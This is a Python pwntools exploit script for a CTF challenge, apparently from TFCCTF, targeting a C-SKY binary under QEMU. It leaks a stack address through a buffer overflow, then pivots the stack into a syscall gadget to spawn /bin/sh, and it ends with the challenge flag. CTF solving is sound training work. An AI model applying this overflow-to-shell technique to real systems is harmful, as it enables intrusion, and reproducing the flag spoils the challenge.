from pwn import *

context.bits = 32
context.log_level = 'debug'

# run command "file ./mucusuki" to get ELF information, due to statically linked, elf address is fixed
'''
./mucusuki: ELF 32-bit LSB executable, C-SKY processor family, version 1 (SYSV), statically linked, stripped
'''

# run command "./qemu ./mucusuki" to execute binary, due to qemu with ASLR disabled, stack address is fixed

# ghidra plugin for C-SKY architecture (https://github.com/leommxj/ghidra_csky) has to be installed to analyze C-SKY binary in ghidra
# C-SKY assembly is closest in style and syntax to MIPS, followed by similarities to RISC-V
# key points of C-SKY assembly that should be noted for this challenge:
# 1. r0-r3 registers are used to store function arguments
# 2. "trap 0x0" instruction in C-SKY is similar to "syscall" instruction in x86_64
# 3. r7 register is used to store syscall number for "trap 0x0" instruction
# 4. syscall number for C-SKY can be found here in https://gpages.juszkiewicz.com.pl/syscalls-table/syscalls.html
# 5. r8 register in C-SKY is similar to rbp register in x86_64, and r15 register in C-SKY is similar to rip register in x86_64

# disassembled vuln function in ghidra
'''
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined vuln()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[2]:     00008156(*), 
                                                                                                   00008188(*)  
                             vuln                                            XREF[1]:     main:000081ac(c)  
        00008150 22 14           subi       sp,sp,0x8
        00008152 ee dd 01 20     st.w       r15,(sp,0x4)
        00008156 0e dd 00 20     st.w       r8,(sp=>local_8,0x0)
        0000815a 3b 6e           mov        r8,sp
        0000815c 39 14           subi       sp,sp,0x64
        0000815e 1b 32           movi       r2,0x1b
        00008160 2e 10           lrw        r1=>s_Give_me_something_to_read:_00008424,PTR_   = "Give me something to read:\n"
                                                                                             = 00008424
        00008162 01 30           movi       r0,0x1
        00008164 00 e0 bc 00     bsr        write                                            undefined write()
        00008168 00 c4 20 48     mov        r0,r0
        0000816c 68 e4 63 10     subi       r3,r8,0x64
        00008170 80 32           movi       r2,0x80
        00008172 41 42           lsli       r2,r2 ,0x1
        00008174 4f 6c           mov        r1,r3
        00008176 00 30           movi       r0,0x0
        00008178 00 e0 8a 00     bsr        read                                             undefined read()
        0000817c 00 c4 20 48     mov        r0,r0
        00008180 03 6c           mov        r0,r0
        00008182 a3 6f           mov        sp,r8
        00008184 ee d9 01 20     ld.w       r15,(sp,0x4)
        00008188 0e d9 00 20     ld.w       r8=>local_8,(sp,0x0)
        0000818c 02 14           addi       sp,sp,0x8
        0000818e 3c 78           rts
'''
# after prolouge and before epilogue:
# value in r8 is saved r8
# value in r8+0x4 is saved r15
# buffer starts from r8-0x64

# decompiled vuln function in ghidra
'''
undefined4 vuln(void)

{
  undefined4 uVar1;
  undefined1 auStack_6c [100];
  
  write(1,"Give me something to read:\n",0x1b);
  uVar1 = read(0,auStack_6c,0x100);
  return uVar1;
}
'''
# read 0x100 bytes at most to buffer (buffer overflow vulnerability)

# 1. leak buffer start address
p = process(['./qemu', './mucusuki'])
# p = remote('mucusuki-dd91a8a9e751f4db.challs.tfcctf.com', 1337, ssl=True)
p.recvuntil(b'Give me something to read:')
# buffer overflow to overwrite vuln's saved r15
# jump from 0x818e (vuln) to 0x8162 (vuln) can call write to leak data on stack
p.sendline(cyclic(0x68)+p32(0x8162))
# leak 0x100 bytes of stack data from buffer start address
p.recvuntil(cyclic(0x40)+p32(0x100))
'''
00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61
00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61
00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61
00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61
00000040  00 01 00 00  1c f6 ff 3f  01 00 00 00  55 00 00 00
00000050  00 00 00 00  80 f6 ff 3f  00 01 00 00  1c f6 ff 3f
00000060  01 00 00 00  7a 61 61 62  68 81 00 00  0a 00 00 00
00000070  00 00 00 00  01 00 00 00  7b f7 ff 3f  00 00 00 00
00000080  86 f7 ff 3f  99 f7 ff 3f  af f7 ff 3f  ce f7 ff 3f
00000090  32 f8 ff 3f  43 f8 ff 3f  4b f8 ff 3f  6b f8 ff 3f
000000a0  76 f8 ff 3f  98 f8 ff 3f  b1 ff ff 3f  bc ff ff 3f
000000b0  d7 ff ff 3f  00 00 00 00  03 00 00 00  34 80 00 00
000000c0  04 00 00 00  20 00 00 00  05 00 00 00  02 00 00 00
000000d0  06 00 00 00  00 10 00 00  07 00 00 00  00 00 00 00
000000e0  08 00 00 00  00 00 00 00  09 00 00 00  a0 81 00 00
000000f0  0b 00 00 00  00 00 00 00  0c 00 00 00  00 00 00 00
'''
# get buffer start address
buffer_start_addr = u32(p.recv(4))
log.info(f"buffer start addr: {hex(buffer_start_addr)}")  # 0x3ffff62c locally, 0x3ffffecc remotely
p.close()

# disassembled syscall function in ghidra
'''
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined syscall()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[2]:     0000820e(*), 
                                                                                                   0000825e(*)  
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     00008218(*), 
                                                                                                   00008244(*)  
             undefined4        Stack[-0x10]:4 local_10                                XREF[2]:     00008220(*), 
                                                                                                   00008232(*)  
             undefined4        Stack[-0x14]:4 local_14                                XREF[2]:     00008226(*), 
                                                                                                   00008238(*)  
             undefined4        Stack[-0x18]:4 local_18                                XREF[2]:     0000822c(*), 
                                                                                                   0000823e(*)  
                             syscall                                         XREF[3]:     read:000082c0(c), 
                                                                                          write:00008310(c), 000083f4(*)  
        00008208 22 14           subi       sp,sp,0x8
        0000820a 0e dd 01 20     st.w       r8,(sp,0x4)
        0000820e e0 b8           st.w       r7,(sp=>local_8,0x0)
        00008210 3b 6e           mov        r8,sp
        00008212 24 14           subi       sp,sp,0x10
        00008214 88 e5 03 10     subi       r12,r8,0x4
        00008218 0c dc 00 20     st.w       r0,(r12=>local_c,0x0)
        0000821c 08 e4 07 10     subi       r0,r8,0x8
        00008220 20 b0           st.w       r1,(r0=>local_10,0x0)
        00008222 28 e4 0b 10     subi       r1,r8,0xc
        00008226 40 b1           st.w       r2,(r1=>local_14,0x0)
        00008228 48 e4 0f 10     subi       r2,r8,0x10
        0000822c 60 b2           st.w       r3,(r2=>local_18,0x0)
        0000822e 68 e4 07 10     subi       r3,r8,0x8
        00008232 00 93           ld.w       r0=>local_10,(r3,0x0)
        00008234 68 e4 0b 10     subi       r3,r8,0xc
        00008238 20 93           ld.w       r1=>local_14,(r3,0x0)
        0000823a 68 e4 0f 10     subi       r3,r8,0x10
        0000823e 40 93           ld.w       r2=>local_18,(r3,0x0)
        00008240 68 e4 03 10     subi       r3,r8,0x4
        00008244 83 d9 00 20     ld.w       r12=>local_c,(r3,0x0)
        00008248 6c e4 ff 20     andi       r3,r12,0xff
        0000824c 14 2b           subi       r3,0x15
        0000824e cf 6d           mov        r7,r3
        00008250 00 c0 20 20     trap       0x0
        00008254 c3 6c           mov        r3,r0
        00008256 0f 6c           mov        r0,r3
        00008258 a3 6f           mov        sp,r8
        0000825a 0e d9 01 20     ld.w       r8,(sp,0x4)
        0000825e e0 98           ld.w       r7,(sp=>local_8,0x0)
        00008260 02 14           addi       sp,sp,0x8
        00008262 3c 78           rts
'''
# after prolouge and before epilogue:
# value in r8-0x8, r8-0xc, and r8-0x10 are viewed as first three syscall arguments and stored in r0, r1, r2 registers
# value in r8-0x4 is subtracted by 0x15, viewed as syscall number, and stored in r7 register for "trap 0x0" instruction

# decompiled syscall function in ghidra
'''
undefined4 syscall(undefined4 param_1,undefined4 param_2)

{
  trap_exception(0);
  return param_2;
}
'''

# 2. trigger execve("/bin/sh", NULL, NULL)
p = process(['./qemu', './mucusuki'])
# p = remote('mucusuki-dd91a8a9e751f4db.challs.tfcctf.com', 1337, ssl=True)
p.recvuntil(b'Give me something to read:')
# buffer overflow to overwrite vuln's saved r8 (for stack pivoting) and vuln's saved r15
# jump from 0x818e (vuln) to 0x822e (syscall) can trigger execve("/bin/sh", NULL, NULL) syscall
p.sendline(b'/bin/sh\x00'+p32(0)+p32(0)+p32(buffer_start_addr)+p32(221+0x15)+cyclic(0x64-0x18)+p32(buffer_start_addr+0x18)+p32(0x822e))
# starting from jumped 0x822e till "trap 0x0" instruction: r8=buffer_start_addr+0x18, r0=*(r8-0x8)=buffer_start_addr=&'/bin/sh\x00', r1=*(r8-0xc)=0, r2=*(r8-0x10)=0, r7=*(r8-0x4)=221+0x15
p.interactive()

# TFCCTF{t0_beat_mcsky_y0u_had_to_csky_now_go_after_cromozominus}